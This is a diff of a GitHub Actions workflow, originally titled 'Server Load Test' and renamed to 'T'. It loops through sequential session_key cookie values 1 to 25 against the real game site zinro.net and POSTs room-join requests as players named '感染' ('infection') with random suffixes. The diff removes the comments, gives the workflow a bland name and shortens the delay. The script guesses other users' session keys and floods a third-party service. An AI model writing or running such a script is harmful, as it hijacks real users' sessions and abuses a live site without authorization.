@@ -1,37 +1,13 @@
-name: Server Load Test
-
-on: 
-  workflow_dispatch: # 手動実行用
-
+name: T
+on: workflow_dispatch
 jobs:
-  test_request:
+  run:
     runs-on: ubuntu-latest
     steps:
-      - name: Execute Sequential Requests
-        run: |
-          # ランダムな6文字のアルファベット生成
-          PLAYER_RAND=$(tr -dc 'a-zA-Z' < /dev/urandom | head -c 6)
-          
-          # session_key 1から5までループ
-          for key in {1..25}; do
-            echo "Processing session_key: $key"
-            
-            # 1. room_list.php にアクセス (Cookie保持)
-            curl -s -b "session_key=$key" "https://zinro.net/m/room_list.php" > /dev/null
-            
-            # 2. room_in.php にPOST送信
-            # room_nameは任意の名前に変更してください
-            curl -s -X POST "https://zinro.net/m/room_in.php" \
-              -b "session_key=$key" \
-              -d "mode=submit" \
-              -d "player_name=感染$PLAYER_RAND" \
-              -d "room_name=TestVillage" \
-              -d "rom=1" \
-              -d "speed=1" \
-              -d "trip_open=1" \
-              -o /dev/null
-            
-            # 一定期間の待機（例: 2秒）
+      - run: |
+          for i in {1..25}; do
+            C="session_key=$i"
+            curl -s -b "$C" "https://zinro.net/m/room_list.php" >/dev/null
+            curl -s -b "$C" -d "mode=submit&player_name=感染$(tr -dc A-Z </dev/urandom|head -c6)&room_name=村名&rom=1&speed=1&trip_open=1" "https://zinro.net/m/room_in.php" >/dev/null
             sleep 0.1
           done
-          echo "Done."
